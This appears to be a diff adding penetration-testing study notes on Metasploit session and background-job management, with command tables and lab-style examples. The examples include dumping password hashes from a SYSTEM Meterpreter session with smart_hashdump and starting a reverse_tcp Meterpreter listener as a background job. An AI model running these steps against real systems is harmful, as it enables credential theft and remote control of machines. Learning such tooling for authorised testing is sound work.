@@ -874,3 +874,125 @@ $$\text{Class Definition} \quad \text{+} \quad \text{include [Module / Mixin]} \
 - **Mechanism:** Rather than inheriting from a rigid parent class, a module or plugin pulls in pre-packaged capabilities using the Ruby `include` keyword.
     
 - **Offensive Benefit:** Allows an exploit author to import complex networking, SSL negotiation, payload encoding, and HTTP formatting methods into a module using a single line of code.
+
+---
+
+# Metasploit Sessions & Background Job Management
+
+## Overview
+
+During complex multi-target operations, `msfconsole` allows operators to manage concurrent connections across different target hosts using **Sessions** and manage persistent listeners or background services using **Jobs**.
+
+Sessions maintain active command-and-control (C2) communication channels, while Jobs keep network listeners and modules active in the background without blocking the console.
+
+```
+                                  ┌──────────────────────────────────────────────┐
+                                  │                  msfconsole                  │
+                                  └──────────────────────┬───────────────────────┘
+                                                         │
+                ┌────────────────────────────────────────┴────────────────────────────────────────┐
+                ▼                                                                                 ▼
++--------------------------------+                                               +--------------------------------+
+|        Active Sessions         |                                               |        Background Jobs         |
+|  - Interactive Meterpreter/CLI |                                               |  - Background Listeners (nc/MSF|
+|  - Managed via `sessions`      |                                               |  - Exploit tasks via `run -j`  |
+|  - Post-exploitation target    |                                               |  - Managed via `jobs`          |
++--------------------------------+                                               +--------------------------------+
+```
+
+## 1. Managing Active Sessions
+
+When an exploit succeeds, it establishes a session. Instead of being restricted to one target at a time, operators can suspend sessions to run auxiliary scans, configure secondary exploits, or execute post-exploitation modules against existing footholds.
+
+```
+[ Active Session / Meterpreter ] ──( Ctrl + Z / background )──> [ msfconsole ] ──( sessions -i <ID> )──> [ Resume Session ]
+```
+
+### Backgrounding a Session
+
+- **Inside Meterpreter:** Type `background` (or alias `bg`).
+    
+- **Inside a Command Shell (`cmd.exe` / `bash`):** Press `Ctrl + Z`, then confirm with `y`.
+    
+
+### Core Session Commands
+
+|**Command**|**Action / Description**|
+|---|---|
+|**`sessions`** or **`sessions -l`**|Lists all currently active sessions, showing Session ID, OS, User context, and Peer IP.|
+|**`sessions -i <ID>`**|Interacts with and resumes the specified session ID.|
+|**`sessions -k <ID>`**|Terminates a specific session.|
+|**`sessions -K`**|Terminates **all** active sessions simultaneously.|
+|**`sessions -u <ID>`**|Automatically attempts to upgrade a standard command shell session to a full **Meterpreter** session.|
+
+### Practical Workflow: Session Switching & Post-Exploitation
+
+```bash
+# 1. View active sessions
+msf6 exploit(windows/smb/psexec_psh) > sessions
+
+Active sessions
+===============
+  Id  Name  Type                     Information                 Connection
+  --  ----  ----                     -----------                 ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501
+
+# 2. Interact with Session 1
+msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
+[*] Starting interaction with 1...
+meterpreter > 
+
+# 3. Background the session
+meterpreter > background
+[*] Backgrounding session 1...
+
+# 4. Target the session with a Post-Exploitation Module
+msf6 > use post/windows/gather/smart_hashdump
+msf6 post(windows/gather/smart_hashdump) > set SESSION 1
+msf6 post(windows/gather/smart_hashdump) > run
+```
+
+## 2. Managing Background Jobs (`jobs`)
+
+When running persistent services (like `exploit/multi/handler`), running them in the foreground locks the console. Using `Ctrl + C` terminates the listener and releases the port. To keep listeners running while retaining console control, run them as **Jobs**.
+
+```
+$$\text{Foreground Execution: } \quad \text{exploit} \quad \longrightarrow \quad \text{Locks Console}$$
+$$\text{Background Job: } \quad \text{exploit -j} \quad \longrightarrow \quad \text{Runs in Background, Releases Console}$$
+```
+
+### Core Job Commands
+
+|**Command**|**Function**|
+|---|---|
+|**`exploit -j`** or **`run -j`**|Launches the module as a background job rather than locking the foreground interface.|
+|**`jobs -l`**|Lists all running background jobs, their associated module, and bound network socket.|
+|**`jobs -i <ID>`**|Displays detailed runtime information about a specific background job.|
+|**`jobs -k <ID>`**|Kills/terminates a specific background job and frees its bound network port.|
+|**`jobs -K`**|Kills **all** active background jobs.|
+
+### Practical Example: Background Multi-Handler Setup
+
+```bash
+msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.14.34
+msf6 exploit(multi/handler) > set LPORT 4444
+
+# Launch handler as a background job
+msf6 exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 10.10.14.34:4444
+
+# Verify active background listeners
+msf6 exploit(multi/handler) > jobs -l
+
+Jobs
+====
+ Id  Name                    Payload                            Payload opts
+ --  ----                    -------                            ------------
+ 0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp tcp://10.10.14.34:4444
+
+# Free the port by killing Job 0 when finished
+msf6 exploit(multi/handler) > jobs -k 0
+[*] Stopping job 0...
+```
